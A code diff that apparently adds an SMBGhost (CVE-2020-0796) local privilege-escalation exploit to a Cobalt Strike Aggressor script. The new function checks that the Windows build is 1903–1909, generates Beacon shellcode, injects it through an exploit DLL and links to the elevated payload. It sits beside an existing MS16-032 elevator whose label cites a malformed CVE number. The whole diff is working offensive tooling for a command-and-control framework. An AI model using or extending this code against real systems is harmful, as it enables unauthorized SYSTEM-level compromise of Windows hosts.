@@ -210,3 +210,42 @@ sub ms16_032_elevator {
 }
 
 beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator); 
+
+# Integrate windows/local/cve_2020_0796_smbghost from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/cve_2020_0796_smbghost.rb
+sub cve_2020_0796_exploit {
+	local('$stager $winbuild');
+
+	# check if we're on an x64 system and error out.
+	if (!-is64 $1) {
+		berror($1, "cve-2020-0796 exploit is x64 only");
+		return;
+	}
+
+	# check the windows version
+	$winbuild = binfo($1, "build");
+	if ($winbuild != 18362 && $winbuild != 18363) {
+		berror($1, "This exploit only supports Windows 10 versions 1903 - 1909");
+		return;
+	}
+
+	# note: this must be 0 or null. exploit will fail if compression is enabled.
+	# reg queryv x64 HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters DisableCompression
+
+	# acknowledge this command
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via cve-2020-0796", "T1068");
+
+	# generate our shellcode
+	$stager = payload_local($1, $2, "x64");
+
+	# prepend our length to the shellcode
+	$stager = pack("I-", strlen($stager)) . $stager;
+
+	# spawn a Beacon post-ex job with the exploit DLL
+	bdllspawn!($1, getFileProper(script_resource("modules"), "CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
+
+	# link to our payload if it's a TCP or SMB Beacon
+	beacon_link($1, $null, $2);
+}
+
+beacon_exploit_register("cve-2020-0796", "SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)", &cve_2020_0796_exploit);
